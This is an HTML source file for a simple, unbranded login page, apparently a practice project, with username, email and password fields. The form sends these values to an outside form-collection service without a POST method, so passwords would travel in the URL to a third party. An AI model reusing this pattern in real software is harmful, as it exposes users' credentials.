<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>lOGIN</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div id="container">
        <div id="center">
            <div id="loginbox">
                <span>Login</span>
            </div>
            <form action="https://formspree.io/f/xnpqwlke" id="form">
                <input type="text" name="user" placeholder="Username" id="user" required><br><br><br><br>
                <input type="email" name="email" placeholder="Email Address" id="email" required><br><br><br><br>
                <input type="password" name="pass" placeholder="Password" id="pass" required>
                <!-- <input type="password" placeholder="Confirm Password" id="conpass" required> -->
               <span id="me">
                   <label>
                     <input type="checkbox" name="remember" id="">
                     Remember me
                   </label>
                   <a href="" id="me2">Forgot Password</a>
                </span>
                <button type="submit"  name="submit" id="btn"  onclick="return confirm('Are you sure you want to submit?')"><a href="">Login</a></button>
                <span id="sign"><span id="have"> Don't have an account</span> <a href="">Sign Up</a> </span>
            </form>
        </div>
    </div>
</body>
</html>
